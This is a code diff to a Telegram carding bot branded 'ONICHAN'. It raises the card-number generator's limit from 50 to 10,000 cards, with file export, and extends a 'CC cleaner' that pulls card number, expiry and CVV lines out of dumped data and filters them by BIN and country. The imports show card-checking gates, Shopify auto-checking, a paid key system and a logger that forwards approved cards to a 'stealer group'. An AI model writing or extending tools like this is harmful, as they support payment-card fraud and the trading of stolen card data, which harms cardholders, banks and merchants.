@@ -131,7 +131,10 @@ from modules.gate_checker import check_card_php, format_gate_response
 from modules.approved_cards_logger import log_approved_card, get_approved_cards, get_approved_count, get_user_approved_cards, set_stealer_group_id, get_stealer_group_id, send_to_stealer_group
 from modules.premium_plans import generate_invoice, get_all_plans, get_plan_info, get_total_revenue, get_payment_stats
 from modules.premium_keys import create_key, redeem_key, validate_key, get_all_keys, get_active_keys, get_key_stats, create_batch_keys, format_keys_display, burn_unused_keys
-from modules.cc_cleaner import extract_cards_from_junk, clean_and_format_cards, remove_duplicates, filter_by_brand, sort_cards, get_statistics
+from modules.cc_cleaner import (
+    extract_cards_from_junk, clean_and_format_cards, remove_duplicates,
+    filter_by_bin, filter_by_country, filter_by_brand, sort_cards, get_statistics
+)
 from modules.cc_generator import generate_cards, parse_gen_format, get_card_brand, validate_generated_card
 from modules.shopify_auto import check_shopify_auto, get_site_product_info
 from modules.user_config import (
@@ -3481,8 +3484,9 @@ async def card_generator(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📌 <b>Examples</b>:\n"
             f"<code>/gen 415920</code>\n"
             f"<code>/gen 415920|xx|26|xxx 20</code>\n"
-            f"<code>/gen 374155|12|xx|xxxx 5</code>\n\n"
-            f"<i>x = random. Max 50 cards.</i>",
+            f"<code>/gen 374155|12|xx|xxxx 500</code>\n\n"
+            f"<i>x = random. Up to 10,000 cards.\n"
+            f"File auto-sent when &gt; 10 cards.</i>",
             parse_mode=ParseMode.HTML
         )
         return
@@ -3500,8 +3504,9 @@ async def card_generator(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"{EMOJI['declined']} Invalid BIN! Must be at least 6 digits.", parse_mode=ParseMode.HTML)
         return
 
-    if count > 50:
-        count = 50
+    MAX_GEN_CARDS = 10000
+    if count > MAX_GEN_CARDS:
+        count = MAX_GEN_CARDS
 
     t0 = time.time()
     generated_cards = generate_cards(bin_number, count, custom_month, custom_year, custom_cvv)
@@ -3527,36 +3532,16 @@ async def card_generator(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card_len = 15 if is_amex else 16
     display_prefix = bin_number + "x" * (card_len - len(bin_number))
 
-    cards_text = "\n".join(f"<code>{c['full']}</code>" for c in generated_cards)
-
-    b_brand = bin_info.get("brand", "") or bin_info.get("scheme", "") or brand
-    b_type = bin_info.get("type", "") or "?"
-    b_level = bin_info.get("category", "") or bin_info.get("level", "") or ""
-    b_bank = bin_info.get("bank", "") or bin_info.get("issuer", "") or "─"
+    b_brand   = bin_info.get("brand", "") or bin_info.get("scheme", "") or brand
+    b_type    = bin_info.get("type", "") or "?"
+    b_level   = bin_info.get("category", "") or bin_info.get("level", "") or ""
+    b_bank    = bin_info.get("bank", "") or bin_info.get("issuer", "") or "─"
     b_country = bin_info.get("country_name", "") or bin_info.get("country", "") or "?"
-    b_iso = bin_info.get("country_code", "") or bin_info.get("iso", "") or "?"
-    b_flag = bin_info.get("flag", "") or bin_info.get("emoji", "") or get_flag_emoji(b_iso)
-    bin_line = f"<code>{bin_number[:6]}</code> — <code>{b_brand}</code> — <code>{b_type}</code>"
+    b_iso     = bin_info.get("country_code", "") or bin_info.get("iso", "") or "?"
+    b_flag    = bin_info.get("flag", "") or bin_info.get("emoji", "") or get_flag_emoji(b_iso)
+    bin_line  = f"<code>{bin_number[:6]}</code> — <code>{b_brand}</code> — <code>{b_type}</code>"
 
     gen_sep = "────────────────────────"
-    text = (
-        f"💜 <b>ONICHAN • CC GENERATOR</b>\n\n"
-        f"{gen_sep}\n\n"
-        f"🔢 <b>BIN</b>         : <code>{display_prefix}</code>\n"
-        f"📊 <b>Generated</b>   : <code>{len(generated_cards)}/{count}</code>\n\n"
-        f"{gen_sep}\n\n"
-        f"{cards_text}\n\n"
-        f"{gen_sep}\n\n"
-        f"💠 <b>Network</b>     : {bin_line}\n"
-    )
-    if b_level and b_level != "UNKNOWN":
-        text += f"📋 <b>Level</b>       : <code>{b_level}</code>\n"
-    text += (
-        f"🏦 <b>Bank</b>        : <code>{b_bank}</code>\n"
-        f"🌍 <b>Country</b>     : {b_flag} <code>{b_country}</code> (<code>{b_iso}</code>)\n\n"
-        f"⏱ <b>Time</b>        : <code>{elapsed_ms}ms</code>"
-    )
-    text = ae(text)
 
     cb_data = f"regen:{bin_number}:{custom_month or 'xx'}:{custom_year or 'xx'}:{custom_cvv or 'xxx'}:{count}"
     if len(cb_data) > 64:
@@ -3568,6 +3553,77 @@ async def card_generator(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'bin': bin_number, 'month': custom_month,
         'year': custom_year, 'cvv': custom_cvv, 'count': count
     }
+
+    # ── Build BIN info footer (shared by both paths) ──────────────────────────
+    def _bin_footer():
+        t = (
+            f"{gen_sep}\n\n"
+            f"💠 <b>Network</b>   : {bin_line}\n"
+        )
+        if b_level and b_level != "UNKNOWN":
+            t += f"📋 <b>Level</b>     : <code>{b_level}</code>\n"
+        t += (
+            f"🏦 <b>Bank</b>      : <code>{b_bank}</code>\n"
+            f"🌍 <b>Country</b>   : {b_flag} <code>{b_country}</code> (<code>{b_iso}</code>)\n\n"
+            f"⏱ <b>Time</b>      : <code>{elapsed_ms}ms</code>"
+        )
+        return t
+
+    # ── More than 10 cards → send as .txt file ────────────────────────────────
+    if len(generated_cards) > 10:
+        from io import BytesIO as _BytesIO
+
+        # First 10 cards shown inline as preview
+        preview_lines = "\n".join(f"<code>{c['full']}</code>" for c in generated_cards[:10])
+        remaining = len(generated_cards) - 10
+
+        text = ae(
+            f"📋 <b>ONICHAN • CC GENERATOR</b>\n\n"
+            f"{gen_sep}\n\n"
+            f"🔢 <b>BIN</b>       : <code>{display_prefix}</code>\n"
+            f"📊 <b>Generated</b> : <code>{len(generated_cards)}</code> cards\n\n"
+            f"{gen_sep}\n\n"
+            f"{preview_lines}\n"
+            f"<i>… and {remaining} more (see attached file)</i>\n\n"
+            + _bin_footer()
+        )
+
+        await _reply_with_gif(update.message, "success", text, reply_markup=reply_markup)
+
+        # Build and send the .txt file
+        all_cards_txt = "\n".join(c["full"] for c in generated_cards)
+        fname = f"Onichan_Gen_By_{user.id}_{len(generated_cards)}.txt"
+        file_bytes = _BytesIO(all_cards_txt.encode("utf-8"))
+        file_bytes.name = fname
+
+        caption = ae(
+            f"📁 <b>Generated Cards</b>\n"
+            f"{gen_sep}\n"
+            f"💳 <b>BIN</b>    : <code>{display_prefix}</code>\n"
+            f"🌐 <b>Network</b>: <code>{b_brand}</code>\n"
+            f"📊 <b>Count</b>  : <code>{len(generated_cards)} cards</code>\n"
+            f"📅 <b>Expiry</b> : <code>random</code>\n"
+            f"🔐 <b>CVV</b>    : <code>random</code>"
+        )
+        await update.message.reply_document(
+            document=file_bytes,
+            filename=fname,
+            caption=caption,
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    # ── 10 or fewer cards → show all inline ──────────────────────────────────
+    cards_text = "\n".join(f"<code>{c['full']}</code>" for c in generated_cards)
+    text = ae(
+        f"💜 <b>ONICHAN • CC GENERATOR</b>\n\n"
+        f"{gen_sep}\n\n"
+        f"🔢 <b>BIN</b>       : <code>{display_prefix}</code>\n"
+        f"📊 <b>Generated</b> : <code>{len(generated_cards)}/{count}</code>\n\n"
+        f"{gen_sep}\n\n"
+        f"{cards_text}\n\n"
+        + _bin_footer()
+    )
 
     await _reply_with_gif(update.message, "success", text, reply_markup=reply_markup)
 
@@ -7350,114 +7406,161 @@ async def cc_scraper(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 @require_approval
 async def clean_cc_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Clean and extract cards from uploaded file"""
+    """
+    Clean, extract, and optionally filter cards from an uploaded .txt file.
+
+    Usage:
+      /clean                           → extract & clean all cards
+      /clean bin:414740,52             → only keep BINs starting with given prefixes
+      /clean country:US,GB             → only keep cards issued in given countries
+      /clean bin:414740 country:US     → combine both filters
+    """
+    from io import BytesIO as _BytesIO
     user = update.effective_user
-    
-    # Check if message has document
+
+    # ── Parse optional args (bin:... country:...) ─────────────────────────────
+    bin_prefixes  = []
+    country_codes = []
+    if context.args:
+        for arg in context.args:
+            if arg.lower().startswith("bin:"):
+                bin_prefixes = [x.strip() for x in arg[4:].split(",") if x.strip()]
+            elif arg.lower().startswith("country:"):
+                country_codes = [x.strip().upper() for x in arg[8:].split(",") if x.strip()]
+
+    # ── Require an attached document ─────────────────────────────────────────
     if not update.message.document:
-        await update.message.reply_text(
-            "❌ <b>No file attached!</b>\n\n"
-            "🎯 <b>Usage:</b>\n"
-            "1. Send /clean command\n"
-            "2. Upload a .txt file with messy card data\n\n"
-            "💡 <b>The bot will extract and clean all valid cards!</b>",
-            parse_mode=ParseMode.HTML
+        sep = "────────────────────────"
+        help_text = ae(
+            f"🧹 <b>ONICHAN • CC CLEANER</b>\n\n"
+            f"{sep}\n\n"
+            f"📎 Attach a <b>.txt file</b> with messy card data and send\n"
+            f"   the <code>/clean</code> command as the caption.\n\n"
+            f"{sep}\n\n"
+            f"📝 <b>Optional filters:</b>\n"
+            f"<code>/clean bin:414740,52</code>     — filter by BIN prefix\n"
+            f"<code>/clean country:US,GB</code>     — filter by country\n"
+            f"<code>/clean bin:414740 country:US</code>\n\n"
+            f"💡 <b>Supported input formats:</b>\n"
+            f"<code>CC|MM|YY|CVV</code>  <code>CC|MM|YYYY|CVV</code>\n"
+            f"<code>CC:MM:YY:CVV</code>  <code>CC/MM/YY/CVV</code>\n"
+            f"<code>CC MM YY CVV</code>  (space-separated)\n"
+            f"(CVV optional, expired cards auto-removed)"
         )
+        await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)
         return
-    
+
     document = update.message.document
-    
-    # Check if it's a txt file
-    if not document.file_name.endswith('.txt'):
-        await update.message.reply_text(ae("❌ Only .txt files are supported!"))
+    if not (document.file_name or "").endswith('.txt'):
+        await update.message.reply_text(ae("❌ Only <b>.txt</b> files are supported!"), parse_mode=ParseMode.HTML)
         return
-    
-    loading_msg = await update.message.reply_text("🧹 Cleaning and extracting cards...")
-    
+
+    loading_msg = await update.message.reply_text("🧹 Cleaning and extracting cards…")
+
     try:
-        # Download file
-        file = await context.bot.get_file(document.file_id)
-        file_content = await file.download_as_bytearray()
-        text_content = file_content.decode('utf-8', errors='ignore')
-        
-        # Extract cards from junk
-        raw_cards = extract_cards_from_junk(text_content)
-        
+        # Download file content
+        tg_file      = await context.bot.get_file(document.file_id)
+        file_bytes_r = await tg_file.download_as_bytearray()
+        text_content = bytes(file_bytes_r).decode('utf-8', errors='ignore')
+
+        # ── Extract ───────────────────────────────────────────────────────────
+        raw_cards    = extract_cards_from_junk(text_content, remove_expired=True)
+        after_dedup  = remove_duplicates(raw_cards)
+        dupes_count  = len(raw_cards) - len(after_dedup)
+
         if not raw_cards:
-            await loading_msg.edit_text(
+            await loading_msg.edit_text(ae(
                 "❌ <b>No valid cards found!</b>\n\n"
-                "The file doesn't contain any valid card formats.\n\n"
-                "💡 <b>Supported formats:</b>\n"
-                "• CC|MM|YY|CVV\n"
-                "• CC:MM:YY:CVV\n"
-                "• CC/MM/YY/CVV\n"
-                "• CC MM YY CVV",
-                parse_mode=ParseMode.HTML
-            )
+                "The file doesn't contain any recognisable card formats.\n\n"
+                "💡 Supported: <code>CC|MM|YY|CVV</code> and variants."
+            ), parse_mode=ParseMode.HTML)
             return
-        
-        # Format and clean cards
-        formatted_cards = clean_and_format_cards(raw_cards)
-        unique_cards = remove_duplicates(formatted_cards)
-        sorted_cards = sort_cards(unique_cards, by='brand')
-        
-        # Get statistics
-        stats = get_statistics(sorted_cards)
-        
-        # Create result message
-        sep = "━━━━━━━━━━━━━━━━━━━━"
-        result_text = f"""💜 <b>ONICHAN • CC CLEANER</b>
-{sep}
-📄 <b>File</b>    : {document.file_name}
-📊 <b>Found</b>   : {len(raw_cards)}
-✅ <b>Unique</b>  : {len(unique_cards)}
-🗑️ <b>Dupes</b>   : {len(raw_cards) - len(unique_cards)}
-{sep}
-💳 <b>By Brand:</b>
-"""
-        
-        for brand, count in stats['by_brand'].items():
-            result_text += f"• {brand}: {count} cards\n"
-        
-        result_text += f"\n🔢 <b>Unique BINs:</b> {stats['unique_bins']}\n\n"
-        result_text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        result_text += "💳 <b>CLEANED CARDS:</b>\n\n"
-        
-        # Show first 20 cards
-        for i, card in enumerate(sorted_cards[:20], 1):
-            result_text += f"{i}. <code>{card['card']}</code> [{card['brand']}]\n"
-        
-        if len(sorted_cards) > 20:
-            result_text += f"\n<i>...and {len(sorted_cards) - 20} more cards</i>\n"
-        
-        result_text += f"""
-━━━━━━━━━━━━━━━━━━━━━━
 
-👤 <b>Cleaned by:</b> @{user.username or user.first_name}
-🤖 <b>Bot:</b> @{BOT_USERNAME}
+        # ── Apply optional filters ────────────────────────────────────────────
+        filtered = after_dedup
+        if bin_prefixes:
+            filtered = filter_by_bin(filtered, bin_prefixes)
+        if country_codes:
+            filtered = filter_by_country(filtered, country_codes)
 
-💡 <b>Tip:</b> Copy cards and use /mass to check them!"""
-        
-        await loading_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
-        
-        # If more than 20 cards, send full list as file
-        if len(sorted_cards) > 20:
-            # Create cleaned file content
-            cleaned_content = "\n".join([card['card'] for card in sorted_cards])
-            cleaned_filename = f"cleaned_{document.file_name}"
-            
-            # Send as document
-            from io import BytesIO
-            file_bytes = BytesIO(cleaned_content.encode('utf-8'))
-            file_bytes.name = cleaned_filename
-            
-            await update.message.reply_document(
-                document=file_bytes,
-                filename=cleaned_filename,
-                caption=f"📁 <b>Full cleaned list ({len(sorted_cards)} cards)</b>",
-                parse_mode=ParseMode.HTML
-            )
-        
+        sorted_cards = sort_cards(filtered, by='brand')
+        stats        = get_statistics(sorted_cards)
+
+        # ── Active filter summary ─────────────────────────────────────────────
+        filter_info = ""
+        if bin_prefixes:
+            filter_info += f"🔍 <b>BIN filter</b>   : <code>{', '.join(bin_prefixes)}</code>\n"
+        if country_codes:
+            filter_info += f"🌍 <b>Country filter</b>: <code>{', '.join(country_codes)}</code>\n"
+
+        sep = "────────────────────────"
+
+        # ── Build stats message ───────────────────────────────────────────────
+        stats_text = (
+            f"🧹 <b>ONICHAN • CC CLEANER</b>\n\n"
+            f"{sep}\n\n"
+            f"📄 <b>File</b>        : <code>{document.file_name}</code>\n"
+            f"📥 <b>Extracted</b>   : <code>{len(raw_cards)}</code>\n"
+            f"✅ <b>Unique</b>      : <code>{len(after_dedup)}</code>\n"
+            f"🗑️ <b>Duplicates</b>  : <code>{dupes_count}</code>\n"
+        )
+        if filter_info:
+            stats_text += f"\n{filter_info}"
+            stats_text += f"📊 <b>After filter</b> : <code>{len(sorted_cards)}</code>\n"
+
+        stats_text += f"\n{sep}\n\n💳 <b>By Brand:</b>\n"
+        for brand, cnt in sorted(stats['by_brand'].items(), key=lambda x: -x[1]):
+            stats_text += f"• {brand}: <code>{cnt}</code> cards\n"
+        stats_text += f"\n🔢 <b>Unique BINs</b>  : <code>{stats['unique_bins']}</code>\n"
+
+        if not sorted_cards:
+            stats_text += f"\n\n⚠️ <i>No cards matched your filters.</i>"
+            await loading_msg.edit_text(ae(stats_text), parse_mode=ParseMode.HTML)
+            return
+
+        # ── Inline preview (first 10 cards) ──────────────────────────────────
+        preview_lines = ""
+        preview_count = min(10, len(sorted_cards))
+        for i, card in enumerate(sorted_cards[:preview_count], 1):
+            preview_lines += f"{i}. <code>{card['card']}</code> <i>[{card['brand']}]</i>\n"
+        if len(sorted_cards) > 10:
+            preview_lines += f"<i>… and {len(sorted_cards) - 10} more (see attached file)</i>\n"
+
+        stats_text += f"\n{sep}\n\n💳 <b>Cleaned Cards:</b>\n\n{preview_lines}"
+        stats_text += (
+            f"\n{sep}\n\n"
+            f"👤 <b>Cleaned by</b> : @{user.username or user.first_name}"
+        )
+
+        await loading_msg.edit_text(ae(stats_text), parse_mode=ParseMode.HTML)
+
+        # ── Always send full .txt file ────────────────────────────────────────
+        cleaned_content = "\n".join(card['card'] for card in sorted_cards)
+        fname           = f"Onichan_Clean_By_{user.id}_{len(sorted_cards)}.txt"
+        out_bytes       = _BytesIO(cleaned_content.encode('utf-8'))
+        out_bytes.name  = fname
+
+        filter_caption = ""
+        if bin_prefixes:
+            filter_caption += f"  BIN: {', '.join(bin_prefixes)}\n"
+        if country_codes:
+            filter_caption += f"  Country: {', '.join(country_codes)}\n"
+
+        caption = ae(
+            f"📁 <b>Cleaned Cards</b>\n"
+            f"{sep}\n"
+            f"📊 <b>Total</b>   : <code>{len(sorted_cards)}</code> cards\n"
+            + (f"🔍 <b>Filters</b> :\n{filter_caption}" if filter_caption else "")
+            + f"👤 <b>By</b>     : @{user.username or user.first_name}"
+        )
+
+        await update.message.reply_document(
+            document=out_bytes,
+            filename=fname,
+            caption=caption,
+            parse_mode=ParseMode.HTML,
+        )
+
     except Exception as e:
         await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))
 
